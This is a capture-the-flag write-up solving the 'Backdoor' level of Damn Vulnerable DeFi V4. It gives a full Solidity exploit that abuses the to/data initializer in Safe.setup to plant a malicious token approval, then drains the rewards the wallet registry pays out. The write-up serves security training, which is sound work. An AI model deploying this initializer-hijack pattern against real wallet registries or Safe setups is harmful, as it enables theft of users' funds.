# Backdoor

To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Safe wallets. When someone in the team deploys and registers a wallet, they earn 10 DVT tokens.

The registry tightly integrates with the legitimate Safe Proxy Factory. It includes strict safety checks.

Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Uncover the vulnerability in the registry, rescue all funds, and deposit them into the designated recovery account. In a single transaction.

# Challenge overview

[official site](https://damnvulnerabledefi.xyz/challenges/compromised)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Backdoor challenge is the elventh level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the funds from the pool.

It has only one contract `WalletRegistry` 

### Logic:
The platform performs as when someone in the team deploys and registers a wallet, they earn 10 DVT tokens.

## How do we exploit it ?

If you go through the [source_code](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions/blob/main/damn-vulnerable-defi/src/backdoor/WalletRegistry.sol) in this repo, u will find some comments that I wrote while I was going through the codes and at line no.87, I smelled something bad because that logic was the main way to enter as validated user who deploys proxy and takes 10 DVT tokens as reward. Then I entered the `Safe.sol` contract and while starting to view the `setUp` function I saw given comment written by dev:
```solidity
* //@dev This method can only be called once.
     *      //If a proxy was created without setting up, anyone can call setup and claim the proxy.
```
>and yeah the protocol lacks validation check here. We can use parameters `to` and `data` to bomb the platform and drain all the funds.

### Exploit flow :
``` 
1. Build a valid Safe.setup(...) initializer
          ↓
2. Make `to` point to YOUR malicious contract
          ↓
3. Put your malicious call inside `data`
          ↓
4. Safe.setup() executes setupModules(to, data)
          ↓
5. Your malicious logic gets executed during initialization
          ↓
6. Use that execution to give your attacker address approval over DVT
          ↓
7. Registry sees a perfectly valid Safe
          ↓
8. Registry sends 10 DVT to the Safe
          ↓
9. You use the approval to transfer those 10 DVT out
```
## POC

Now, before going to the POC you should try to write exploit yourself and if you get errors and confusions here is the POC:

```solidity
    contract Exploit {
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;
    address recovery;
    uint immutable AMOUNT_TOKENS_DISTRIBUTED;
    MaliciousApprover maliciousApprover;
    constructor(
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        DamnValuableToken _token,
        WalletRegistry walletRegistryAddress,
        address[] memory _beneficiaries,
        address recoveryAddress,
        uint amountTokensDistributed
    ) payable {
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        token = _token;
        walletRegistry = walletRegistryAddress;
        beneficiaries = _beneficiaries;
        recovery = recoveryAddress;
        AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;
        maliciousApprover = new MaliciousApprover();
    }

    function attack() public {
        for(uint i = 0 ; i < beneficiaries.length; i ++){
            address newOwner = beneficiaries[i];
            address[] memory owners = new address[](1);
            owners[0] = newOwner;

            address maliciousTo = address(maliciousApprover);
            bytes memory maliciousData = abi.encodeCall(
                maliciousApprover.approveTokens,
                (token, address(this))
            );
            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    maliciousTo,
                    maliciousData,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );
            token.transferFrom(
                address(proxy),
                address(this),
                token.balanceOf(address(proxy))
            );
        }
        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
    }
}   
contract MaliciousApprover {
    function approveTokens(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}
```

Now, you have one job left implement the contract in the test_backdoor function and call `attack` function.
```solidity
function test_backdoor() public checkSolvedByPlayer {
    Exploit backdoorExploit = new Exploit(
        singletonCopy,
        walletFactory,
        token,
        walletRegistry,
        users,
        recovery,
        AMOUNT_TOKENS_DISTRIBUTED
    );
    backdoorExploit.attack();
}

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**